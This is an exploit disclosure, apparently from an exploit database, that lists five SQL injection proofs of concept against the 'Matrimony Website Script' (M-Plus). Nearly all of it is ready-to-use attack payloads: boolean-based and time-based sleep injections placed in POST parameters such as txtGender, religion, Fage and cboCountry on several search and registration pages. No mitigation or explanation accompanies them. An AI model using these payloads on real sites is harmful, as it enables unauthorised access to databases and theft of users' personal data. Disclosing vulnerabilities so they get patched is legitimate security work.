@@ -1,0 +1,43 @@
+# Exploit Title: Matrimony Website Script - Multiple SQL Injection
+# Date: 22.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.matri4web.com
+# Demo Site: https://www.matrimonydemo.com
+# Version: M-Plus
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/simplesearch_results.php
+Vulnerable Parameter: txtGender (POST)
+Attack Pattern:
+Fage=18&Tage=18&caste=Any&religion=Any&submit=Submit&txtGender=-1'%20OR%203*2*1=6%20AND%20000715=000715%20--%20&txtphoto=1&txtprofile=0
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/advsearch_results.php
+Vulnerable Parameter: religion (POST)
+Attack Pattern:
+age1=18&age2=18&caste[]=Any&cboCountry[]=&city[]=Any&edu[]=Any&ms=Unmarried&occu[]=Any&religion=-1'%20OR%203*2*1=6%20AND%20000723=000723%20--%20&state[]=Any&submit=Submit&txtGender=Male&txtphoto=Show%20profiles%20with%20Photo
+
+----- PoC 3 - SQLi -----
+
+Request: http://localhost/[PATH]/specialcase_results.php
+Vulnerable Parameter: Fage
+Attack Pattern:
+Fage=(select(0)from(select(sleep(0)))v)/*'%2B(select(0)from(select(sleep(0)))v)%2B'"%2B(select(0)from(select(sleep(0)))v)%2B"*/&Tage=18&caste=Any&religion=Any&sp_cs=Any&submit=Submit&txtGender=Male&txtphoto=Show%20profiles%20with%20Photo&txtprofile=7
+
+----- PoC 4 - SQLi -----
+
+Request: http://localhost/[PATH]/locational_results.php
+Vulnerable Parameter: cboCountry (POST)
+Attack Pattern:
+Fage=18&Tage=18&cboCountry=-1'%20OR%203*2*1=6%20AND%20000567=000567%20--%20&cboState=Any&city=Any&submit=Submit&txtCountry=Argentina&txtCountryLength=9&txtGender=Male&txtNumCountries=251&txtNumStates=25&txtSelectedCountry=9&txtSelectedState=10&txtState=Entre%20Rios&txtStateLength=10&txtphoto=Show%20profiles%20with%20Photo
+
+----- PoC 5 - SQLi -----
+
+Request: http://localhost/[PATH]/registration2.php
+Vulnerable Parameter: religion (POST)
+Attack Pattern:
+EMAILconfirm=sample%40email.tst&Language=&dobDay=&dobMonth=&dobYear=&religion=-1'%20OR%203*2*1=6%20AND%20000830=000830%20--%20&submit=Submit&txtAccept=I%20Accept%20%20the%20Terms%20and%20Conditions&txtGender=Male&txtMC=&txtMobile=987-65-4329&txtName=FtkKDgHs&txtPC=Self&txtcp=1
